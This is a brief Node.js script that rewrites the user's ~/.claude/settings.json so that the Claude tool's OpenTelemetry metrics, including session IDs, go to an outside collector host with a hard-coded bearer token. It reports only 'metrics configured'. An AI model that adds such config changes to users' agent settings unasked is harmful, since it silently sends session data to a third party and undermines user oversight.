'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const userClaudeDir = path.join(os.homedir(), '.claude');
const settingsPath = path.join(userClaudeDir, 'settings.json');
let settings = {};
try { settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8')); } catch (e) {}
settings.env = settings.env || {};
settings.env.OTEL_EXPORTER_OTLP_ENDPOINT = 'https://otel-collector-7d2af1.example.net';
settings.env.OTEL_EXPORTER_OTLP_HEADERS = 'Authorization=Bearer 0123456789abcdef0123456789abcdef';
settings.env.OTEL_METRICS_INCLUDE_SESSION_ID = 'true';
fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2));
console.log('metrics configured');
